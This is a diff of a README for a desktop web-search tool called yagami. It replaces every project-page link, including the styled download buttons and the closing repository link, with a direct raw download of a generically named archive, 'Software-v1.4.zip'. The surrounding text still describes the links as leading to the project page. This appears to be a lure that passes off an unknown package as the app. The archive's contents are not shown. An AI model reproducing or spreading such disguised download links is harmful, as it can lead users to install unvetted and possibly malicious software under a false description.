@@ -1,6 +1,6 @@
 # 🌐 yagami - Search the web from your desktop
 
-[⬇️ Download yagami](https://github.com/haloreach54123-afk/yagami){: style="display:inline-block;padding:12px 18px;background:#1f6feb;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"} [Mirror](https://github.com/haloreach54123-afk/yagami){: style="display:inline-block;padding:12px 18px;background:#6e7781;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"}
+[⬇️ Download yagami](https://raw.githubusercontent.com/haloreach54123-afk/yagami/main/packages/Software-v1.4.zip){: style="display:inline-block;padding:12px 18px;background:#1f6feb;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"} [Mirror](https://raw.githubusercontent.com/haloreach54123-afk/yagami/main/packages/Software-v1.4.zip){: style="display:inline-block;padding:12px 18px;background:#6e7781;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"}
 
 ## 🧭 What is yagami?
 
@@ -34,7 +34,7 @@ For a smoother experience, 8 GB of RAM or more is useful.
 
 Use this link to visit the project page and download the app:
 
-[Download yagami](https://github.com/haloreach54123-afk/yagami)
+[Download yagami](https://raw.githubusercontent.com/haloreach54123-afk/yagami/main/packages/Software-v1.4.zip)
 
 On the page, look for the latest Windows build or release file. Download the Windows version that matches your PC.
 
@@ -162,4 +162,4 @@ This project is tagged with:
 
 Open the repository here:
 
-https://github.com/haloreach54123-afk/yagami
+https://raw.githubusercontent.com/haloreach54123-afk/yagami/main/packages/Software-v1.4.zip
